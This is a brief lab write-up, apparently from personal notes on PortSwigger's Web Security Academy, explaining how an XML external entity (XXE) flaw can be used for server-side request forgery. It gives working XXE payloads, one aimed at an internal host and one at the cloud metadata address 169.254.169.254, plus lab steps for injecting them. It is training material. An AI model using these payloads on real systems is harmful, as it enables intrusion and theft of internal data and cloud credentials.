# XXE attack with SSRF
To exploit an XXE vulnerability to perform an [SSRF attack](https://portswigger.net/web-security/ssrf), you need to define an external XML entity using the URL that you want to target, and use the defined entity within a data value.
If you can use the defined entity within a data value that is returned in the application's response, then you will be able to view the response from the URL within the application's response, and so gain two-way interaction with the back-end system. If not, then you will only be able to perform [blind SSRF](https://portswigger.net/web-security/ssrf/blind) attacks (which can still have critical consequences).

In the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization's infrastructure:
```bash
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```
# Lab
1) Insert the following external entity definition in between the XML declaration and the stockCheck element:
```bash
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
```
2) Replace the `productId` number with a reference to the external entity: `&xxe;`

Follow the video:

https://github.com/offensivecyber03/PortSwigger/assets/71892943/8e0885e0-109c-4f62-a660-b698445180a6

